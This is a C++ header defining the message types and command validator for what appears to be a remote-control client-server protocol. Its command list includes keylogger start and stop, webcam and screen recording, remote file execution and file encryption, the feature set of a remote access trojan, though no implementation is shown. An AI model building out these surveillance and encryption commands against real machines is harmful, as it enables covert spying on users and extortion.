#pragma once

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
        #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>

    #undef ERROR  
#endif
#undef ECHO

#include <string>
#include <unordered_set>

namespace Protocol {
    static const std::string VERSION = "1.0";

    namespace TYPE {
        static constexpr const char* PING = "ping";
        static constexpr const char* PONG = "pong"; 
        static constexpr const char* AUTH = "auth";
        static constexpr const char* HEARTBEAT = "heartbeat";
        static constexpr const char* ERROR = "error";
        static constexpr const char* BROADCAST = "broadcast";
        
        // app
        static constexpr const char* APP_LIST = "LISTAPP";
        static constexpr const char* APP_START = "STARTAPP";
        static constexpr const char* APP_KILL = "STOPAPP";

        // process
        static constexpr const char* PROC_LIST = "LISTPROC";
        static constexpr const char* PROC_START = "STARTPROC";
        static constexpr const char* PROC_KILL = "STOPPROC";

        static constexpr const char* CAM_RECORD = "CAM_RECORD";
        static constexpr const char* CAMSHOT = "CAMSHOT";
        static constexpr const char* SCREENSHOT = "SCRSHOT";
        static constexpr const char* SCR_RECORD = "SCR_RECORD";
        static constexpr const char* START_KEYLOG = "STARTKLOG";
        static constexpr const char* STOP_KEYLOG = "STOPKLOG";

        // power
        static constexpr const char* SHUTDOWN = "shutdown";
        static constexpr const char* RESTART = "restart";
        static constexpr const char* SLEEP = "sleep";

        static constexpr const char* ECHO = "echo";
        static constexpr const char* WHOAMI = "whoami";

        static constexpr const char* STREAM_DATA = "stream_data";
        
        static constexpr const char* FILE_LIST = "file_list";

        static constexpr const char* FILE_EXECUTES = "file_execute";
        static constexpr const char* FILE_ENCRYPT = "file_encrypt";
        
        // file transfer
        static constexpr const char* FILE_UPLOAD = "file_upload";
        static constexpr const char* FILE_DOWNLOAD = "file_download";
        static constexpr const char* FILE_CHUNK = "file_chunk";
        static constexpr const char* FILE_PROGRESS = "file_progress";
        static constexpr const char* FILE_COMPLETE = "file_complete";
        static constexpr const char* SYSTEM_INFO = "system_info";
    }

    inline const std::unordered_set<std::string>& validCommands() {
        static std::unordered_set<std::string> types = {
            TYPE::PING,
            TYPE::PONG,
            TYPE::AUTH,
            TYPE::HEARTBEAT,
            TYPE::ERROR,
            TYPE::BROADCAST,

            TYPE::APP_LIST,
            TYPE::APP_START,
            TYPE::APP_KILL,

            TYPE::PROC_LIST,
            TYPE::PROC_START,
            TYPE::PROC_KILL,
            TYPE::CAM_RECORD,
            TYPE::CAMSHOT,
            TYPE::SCREENSHOT,
            TYPE::SCR_RECORD,
            TYPE::START_KEYLOG,
            TYPE::STOP_KEYLOG,

            TYPE::SHUTDOWN,
            TYPE::RESTART,
            TYPE::SLEEP,

            TYPE::ECHO,
            TYPE::WHOAMI,

            TYPE::STREAM_DATA,
            TYPE::FILE_LIST,
            TYPE::FILE_EXECUTES,
            TYPE::FILE_ENCRYPT,
            TYPE::FILE_UPLOAD,
            TYPE::FILE_DOWNLOAD,
            TYPE::FILE_CHUNK,
            TYPE::FILE_PROGRESS,
            TYPE::FILE_COMPLETE,
            TYPE::SYSTEM_INFO
        };
        
        return types;
    }

    inline bool isValidCommand(const std::string& type) {
        return validCommands().count(type) > 0;
    }

    namespace ERROR {
        static constexpr const char* INVALID_CMD = "invalid_command";
        static constexpr const char* BAD_FORMAT = "bad_format";
        static constexpr const char* UNAUTHORIZED = "unauthorized";
        static constexpr const char* UNKNOWN_ERROR = "unkown_error";
    }
}